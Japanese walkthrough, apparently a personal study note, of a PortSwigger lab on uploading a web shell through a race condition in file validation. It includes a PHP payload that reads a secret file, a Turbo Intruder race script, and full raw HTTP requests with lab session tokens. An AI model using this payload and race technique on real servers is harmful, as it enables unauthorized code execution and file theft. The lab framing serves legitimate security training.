# 競合状態による Web シェルのアップロード

以下のラボではアップロードファイルを一時フォルダで検証後に削除しますが、
検証に時間が掛かるため、高速なリクエスト発行に対して脆弱です  
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition

- 1. Burp Suite を起動して、Proxy タブからブラウザを立ち上げます
- 2. 立ち上げたブラウザから上記ハッキングラボにアクセスします
- 3. 一般ユーザーでログインして、アバター画像をアップロードします
- 4. 以下の攻撃用スクリプトを作成します

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

- 5. 上記スクリプトをアバター画像としてアップロードを試みます  
     以下のメッセージを受け取ります

```
Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file.
```

- 6. Turbo intruder をロードしていない場合はロードします
- 7. POST /my-account/avatar HTTP/2 リクエストを Send to trurbo intruder します

- 8. 次のスクリプトを turbo intruder に張り付けます  
     POST した後に続けて、GET を 5 回行うスクリプトです。

````py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
    ```
````

- 9. POST と GET リクエストをセットします

```py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''POST /my-account/avatar HTTP/2
Host: 0abe004f049eacd6831d60b4002100a1.web-security-academy.net
Cookie: session=SDkRGCrtdT7VlSxFrK7jTtU9mNqtuVNR
Content-Length: 476
Cache-Control: max-age=0
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
Origin: https://0abe004f049eacd6831d60b4002100a1.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcmqzABC2Dm8BS5B
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0abe004f049eacd6831d60b4002100a1.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

------WebKitFormBoundarygcmqzABC2Dm8BS5B
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundarygcmqzABC2Dm8BS5B
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundarygcmqzABC2Dm8BS5B
Content-Disposition: form-data; name="csrf"

uOUU8upgMGR4IQFANYoRMZAjlM0qGn2t
------WebKitFormBoundarygcmqzABC2Dm8BS5B--
'''

    request2 = '''GET /files/avatars/exploit.php HTTP/2
Host: 0abe004f049eacd6831d60b4002100a1.web-security-academy.net
Cookie: session=SDkRGCrtdT7VlSxFrK7jTtU9mNqtuVNR
Sec-Ch-Ua:
If-None-Match: "59d4-6022b63b045fb"
If-Modified-Since: Sat, 05 Aug 2023 11:33:59 GMT
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Sec-Ch-Ua-Platform: ""
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0abe004f049eacd6831d60b4002100a1.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

- 10. 攻撃実行すると初回の GET リクエストのリターンコードが 200 です。レスポンスを見るとスクリプトの実行結果が格納されています。
      ![2](https://github.com/pea-sys/Til/assets/49807271/d8c2b4c7-39b5-4358-b714-ee7cab33d0fe)
